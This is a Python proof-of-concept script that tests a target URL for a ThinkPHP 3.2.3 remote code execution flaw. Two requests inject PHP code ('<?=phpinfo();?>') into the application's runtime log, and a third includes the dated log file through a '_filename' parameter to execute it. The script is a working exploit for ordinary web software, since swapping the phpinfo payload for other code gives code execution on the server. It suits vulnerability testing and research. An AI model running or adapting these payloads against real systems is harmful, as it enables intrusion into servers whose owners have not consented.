# Coding by Noel
# Date: 2021/8/7
# Version: Thinkphp 3.2.3
# Encoding utf-8
# Reference: https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ
#------------------------------------------------------------------

import re
import sys
import time
import datetime
import urllib
import requests
from urllib import request


#------------------------------------------------------------------

today = str(datetime.date.today())
re_title = re.compile(r'<title>(.*?)</title>')

poc1 = '/index.php?m=--><?=phpinfo();?>'  # ThinkPHP Debug Module = False
poc2 = '/index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?>'	# ThinkPHP Debug Module = True
poc1_log = f'/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/{today[2:4]}_{today.split("-")[1]}_{today.split("-")[2]}.log'
poc2_log = f'/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/{today[2:4]}_{today.split("-")[1]}_{today.split("-")[2]}.log'

def check_tp3_2_3_log_RCE(url):
	print("[-] Now test poc1...")
	poc_check_1 = url + poc1
	try:
		res = request.urlopen(poc_check_1)
		sys.exit("[-] no vulerability...")	
	except urllib.error.HTTPError as f:
		check_log(url,poc1_log)


	print("[-] Now test poc2...")
	poc_check_2 = url + poc2
	try:
		res = request.urlopen(poc_check_2)
		if res.getcode() == 200:
			check_log(url,poc2_log)
	except:
		sys.exit(f"[-] Target URL {url} no vulerability...")


def check_log(url,poc):
	res_log = requests.get(url+poc)
	if res_log.status_code == 200: 
		if re_title.findall(res_log.text)[0] == 'phpinfo()':
			print(f"[+] Target URL {url} exists ThinkPHP_3_2_3 log RCE...")
		elif '=phpinfo();' in res_log.text:
			print(f"[+] Target URL {url} log leaked...")
		else:
			print(f"[+] Target URL {url} no vulnerability...")

if __name__ == '__main__':
	Target_url = sys.argv[1]
	check_tp3_2_3_log_RCE(Target_url)